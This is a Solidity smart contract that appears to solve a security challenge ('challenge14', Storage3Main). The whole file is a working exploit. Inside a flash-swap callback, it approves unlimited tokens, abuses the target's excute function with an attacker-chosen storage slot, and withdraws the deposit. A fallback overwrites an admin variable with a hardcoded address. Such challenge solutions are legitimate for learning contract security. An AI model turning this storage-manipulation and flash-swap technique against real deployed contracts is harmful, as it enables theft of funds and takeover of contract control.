pragma solidity ^0.8.0;

import "../challenge14/Storage3Main.sol";
import "hardhat/console.sol";

contract Storage3MainSolution {
    IERC20 public token;
    uint256 public constant VERSION = 1;
    address public admin;

    Storage3Main storage3Main;
    MdexPair public pair;
    Storage3 public storage3;
    MyToken public tokena;
    bytes32 condition;

    constructor(address storage3main) {
        storage3Main = Storage3Main(storage3main);
        pair = storage3Main.pair();
        storage3 = storage3Main.storage3();
        tokena = storage3Main.tokena();
    }

    function expliot(bytes32 slot) public {
        condition = slot;
    }

    function hswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        tokena.approve(
            address(storage3),
            0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
        );
        address b = address(this);
        uint256 a = uint256(uint160(b));

        storage3.deposit(address(this), a);

        storage3.excute(condition);
        storage3.withdraw(storage3.gasDeposits(address(this)));
        tokena.transfer(
            address(pair),
            999999999999999999999999999999999999999999999999
        );
    }

//    function evaluate(
//        uint256 a,
//        uint112 b,
//        bool c,
//        address d
//    ) public {
//        admin = address(0x70997970C51812dc3A010C7d01b50e0d17dc79C8);
//    }
    fallback() external {

        admin = address(0x70997970C51812dc3A010C7d01b50e0d17dc79C8);
    }
}
